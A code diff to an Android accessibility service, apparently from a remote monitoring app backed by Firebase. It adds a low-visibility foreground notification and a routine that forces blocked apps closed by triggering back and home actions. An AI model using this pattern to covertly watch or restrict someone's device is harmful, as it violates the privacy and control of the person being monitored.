@@ -1,7 +1,13 @@
 package com.reiserx.testtrace.Screenshot;
 
 import android.accessibilityservice.AccessibilityServiceInfo;
+import android.annotation.SuppressLint;
 import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.content.Context;
+import android.content.Intent;
 import android.content.SharedPreferences;
 import android.graphics.Bitmap;
 import android.media.MediaRecorder;
@@ -18,6 +24,7 @@ import android.view.accessibility.AccessibilityNodeInfo;
 import android.widget.Toast;
 
 import androidx.annotation.NonNull;
+import androidx.core.app.NotificationCompat;
 
 import com.google.firebase.database.DataSnapshot;
 import com.google.firebase.database.DatabaseError;
@@ -28,13 +35,17 @@ import com.google.firebase.firestore.DocumentReference;
 import com.google.firebase.firestore.FirebaseFirestore;
 import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.StorageReference;
+import com.reiserx.testtrace.Activites.MainActivity;
 import com.reiserx.testtrace.Classes.ExceptionHandler;
 import com.reiserx.testtrace.Models.AudiosDownloadUrl;
 import com.reiserx.testtrace.Models.TaskSuccess;
+import com.reiserx.testtrace.Operations.getCurrentTask;
+import com.reiserx.testtrace.R;
 import com.reiserx.testtrace.Utilities.getRandom;
 
 import java.io.File;
 import java.util.Calendar;
+import java.util.Objects;
 import java.util.concurrent.Executor;
 
 public class accessibilityService extends android.accessibilityservice.AccessibilityService {
@@ -65,6 +76,8 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
         instance = this;
         updateAccessibility();
         Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
+
+        sendNotification(this, "Test", "test", 10);
     }
 
     @Override
@@ -135,6 +148,8 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
                 }
             }
         }
+
+        disableApps(String.valueOf(accessibilityEvent.getPackageName()));
     }
 
     public void uninstalls() {
@@ -322,5 +337,55 @@ public class accessibilityService extends android.accessibilityservice.Accessibi
         String UserID = save.getString("UserID", "");
         String currentTime = java.text.DateFormat.getDateTimeInstance().format(Calendar.getInstance().getTime());
         FirebaseDatabase.getInstance().getReference().child("Main").child(UserID).child("ServiceStatus").child("AccessibilityUpdate").setValue(currentTime);
+    }
+
+    public void sendNotification(Context context, String title, String content, int id) {
+
+        NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
+        String channel_id = "ServiceRestart365";
+
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+            @SuppressLint("WrongConstant")
+            NotificationChannel notificationChannel = new NotificationChannel(channel_id, "Service restart", NotificationManager.IMPORTANCE_NONE);
+            notificationChannel.setDescription("service");
+
+            notificationManager.createNotificationChannel(notificationChannel);
+        }
+        NotificationCompat.Builder notify_bulder = new NotificationCompat.Builder(context, channel_id);
+        notify_bulder.setAutoCancel(true)
+                .setDefaults(Notification.DEFAULT_ALL)
+                .setWhen(System.currentTimeMillis())
+                .setSmallIcon(R.drawable.ic_baseline_circle_notifications_24)
+                .setPriority(NotificationManager.IMPORTANCE_LOW)
+                .setContentText(content)
+                .setContentTitle(title)
+                .setContentInfo("info");
+        @SuppressLint("UnspecifiedImmutableFlag") PendingIntent contentIntent = null;
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
+            contentIntent = PendingIntent.getActivity(context, 0,
+                    new Intent(context, MainActivity.class), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE);
+        } else {
+            contentIntent = PendingIntent.getActivity(context, 0,
+                    new Intent(context, MainActivity.class), PendingIntent.FLAG_UPDATE_CURRENT);
+        }
+
+        notify_bulder.setContentIntent(contentIntent);
+
+
+        // Gets an instance of the NotificationManager service
+        notificationManager.notify(id, notify_bulder.build());
+// Notification ID cannot be 0.
+        startForeground(id, notify_bulder.getNotification());
+    }
+
+    void disableApps(String packageName) {
+        SharedPreferences save = getSharedPreferences("blocked", MODE_PRIVATE);
+        if (Objects.equals(save.getString(packageName, ""), "1")) {
+            getCurrentTask getCurrentTask = new getCurrentTask(this);
+            if (save.getString(getCurrentTask.getPackage(), "").equals("1")) {
+                performGlobalAction(GLOBAL_ACTION_BACK);
+                performGlobalAction(GLOBAL_ACTION_HOME);
+            }
+        }
     }
 }
